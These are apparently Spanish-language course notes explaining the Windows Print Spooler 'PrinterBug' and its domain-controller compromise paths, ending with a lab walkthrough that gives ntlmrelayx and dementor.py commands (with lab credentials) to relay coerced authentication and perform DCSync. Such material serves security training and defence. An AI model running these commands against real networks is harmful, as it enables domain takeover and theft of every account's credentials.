El [servicio de cola de impresión (Print Spooler)](https://learn.microsoft.com/en-us/windows/win32/printdocs/print-spooler) es un servicio antiguo habilitado por defecto, incluso en las últimas versiones de Windows Desktop y Servers. El servicio se convirtió en un vector de ataque popular cuando en 2018, `Lee Christensen` encontró el `PrinterBug`. Las funciones [RpcRemoteFindFirstPrinterChangeNotification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83) y [RpcRemoteFindFirstPrinterChangeNotificationEx](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d) pueden ser abusadas para forzar a una máquina remota a realizar una conexión con cualquier otra máquina que pueda alcanzar. Además, la conexión `inversa` (reverse connection) llevará información de autenticación como un `TGT`. Por lo tanto, cualquier usuario del dominio puede forzar a `RemoteServer$` a autenticarse en cualquier máquina. La postura de Microsoft sobre el `PrinterBug` fue que no se solucionaría, ya que el problema es "por diseño" (by-design).

El impacto del `PrinterBug` es que cualquier Controlador de Dominio (Domain Controller) que tenga el servicio de cola de impresión habilitado puede ser comprometido de una de las siguientes maneras:

1. Retransmitir la conexión a otro DC y realizar un DCSync (si la `firma SMB (SMB Signing)` está deshabilitada).
2. Forzar al Controlador de Dominio a conectarse a una máquina configurada para `delegación sin restricciones (Unconstrained Delegation)` (`UD`); esto almacenará en caché el TGT en la memoria del servidor UD, el cual puede ser capturado/exportado con herramientas como `Rubeus` y `Mimikatz`.
3. Retransmitir la conexión a los `Servicios de Certificados de Active Directory (Active Directory Certificate Services)` para obtener un certificado para el Controlador de Dominio. Los agentes de amenaza (threat agents) pueden entonces usar el certificado bajo demanda para autenticarse y hacerse pasar por el Controlador de Dominio (p. ej., para un DCSync).
4. Retransmitir la conexión para configurar la `delegación Kerberos basada en recursos (Resource-Based Kerberos Delegation)` para la máquina retransmitida. Luego podemos abusar de la delegación para autenticarnos como cualquier Administrador en esa máquina.

## Ataque

En esta ruta de ataque, retransmitiremos la conexión a otro DC y realizaremos un `DCSync` (es decir, la primera técnica de compromiso listada). Para que el ataque tenga éxito, la firma SMB en los Controladores de Dominio debe estar desactivada.

Para empezar, configuraremos `NTLMRelayx` para reenviar cualquier conexión a DC2 e intentar realizar el ataque DCSync:

```
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
```

Por otra consola
```
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```
Ahora, volviendo a la sesión de terminal con `NTLMRelayx`, veremos que el DCSync fue exitoso
![[Pasted image 20260917130354.png|739]]